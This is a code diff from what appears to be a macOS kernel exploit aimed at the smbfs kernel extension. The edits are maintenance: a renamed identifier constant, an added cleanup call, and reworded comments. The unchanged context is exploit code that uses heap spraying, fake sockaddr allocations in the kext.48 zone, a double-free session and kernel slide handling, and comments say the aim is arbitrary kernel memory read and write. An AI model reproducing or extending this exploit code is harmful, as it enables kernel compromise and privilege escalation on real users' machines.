@@ -124,8 +124,6 @@ static_assert(sizeof(struct smb_dev) == 48, "");
 #define NUM_SMB_DEV_CAPTURE_ALLOCS   512
 #define NUM_SMB_DEV_RECAPTURE_ALLOCS 512
 
-#define SMBFS_IDENTIFIER "com.apple.filesystems.smbfs"
-
 
 static const struct sockaddr_in6 SMB_DEV_CAPTURE_DATA = {
     .sin6_len = sizeof(struct sockaddr_in6),
@@ -160,7 +158,7 @@ smb_dev_rw_session_shared_t smb_dev_rw_shared_session_ref(smb_dev_rw_session_sha
 
 
 void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
-    xe_slider_kext_t slider = xe_slider_kext_create(SMBFS_IDENTIFIER, XE_KC_BOOT);
+    xe_slider_kext_t slider = xe_slider_kext_create(KEXT_SMBFS_IDENTIFIER, XE_KC_BOOT);
     xe_kheap_free_session_destroy(&session->dbf_session, slider);
     if (session->sock_addr_entry_allocator) {
         /// Patch the `client_nic_info_list` to prevent NICs from being released
@@ -176,6 +174,7 @@ void smb_dev_rw_shared_session_destroy(smb_dev_rw_session_shared_t session) {
         });
         kmem_allocator_prpw_destroy(&session->sockaddr_allocator);
     }
+    xe_slider_kext_destroy(&slider);
     free(session);
 }
 
@@ -428,14 +427,14 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     };
     
     int64_t sockaddr_found_index = -1;
-    /// Check whether the `fake_sockaddr` was replaced by a allocation from heap
+    /// Check whether the memory of `fake_sockaddr` was replaced by a allocation from heap
     /// spray in STEP 6
     error = kmem_allocator_prpw_filter(fake_sockaddr_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(fake_sockaddr_alloc.element_allocator), filter, NULL, &sockaddr_found_index);
     xe_assert_err(error);
     
     int64_t sock_addr_entry_found_index = -1;
-    /// Check whether the `fake_sock_addr_entry` was replaced by an allocation from
-    /// heap spray in STEP 6
+    /// Check whether the memory of `fake_sock_addr_entry` was replaced by an allocation
+    /// from heap spray in STEP 6
     error = kmem_allocator_prpw_filter(fake_sock_addr_entry_alloc.element_allocator, 0, kmem_allocator_prpw_get_capacity(fake_sock_addr_entry_alloc.element_allocator), filter, NULL, &sock_addr_entry_found_index);
     xe_assert_err(error);
     
@@ -546,15 +545,17 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
         kmem_allocator_prpw_destroy(&fake_sockaddr_alloc.element_allocator);
     } else {
         /// Fake sockaddr allocation is currently sharing memory with an unknown
-        /// allocated / free element in kext.48 zone. Releasing it now may panic
+        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
+        /// patch and release it once we have working arbitary kernel memory read / write
         session->sockaddr_allocator = fake_sockaddr_alloc.element_allocator;
     }
     
     if (sock_addr_entry_found_index >= 0) {
         kmem_allocator_prpw_destroy(&fake_sock_addr_entry_alloc.element_allocator);
     } else {
-        /// Fake sockaddr allocation is currently sharing memory with an unknown
-        /// allocated / free element in kext.48 zone. Releasing it now may panic
+        /// Fake sock_addr_entry allocation is currently sharing memory with an unknown
+        /// allocated / free element in kext.48 zone. Releasing it now may panic, so we will
+        /// patch and release it once we have working arbitary kernel memory read / write
         session->sock_addr_entry_allocator = fake_sock_addr_entry_alloc.element_allocator;
     }
     
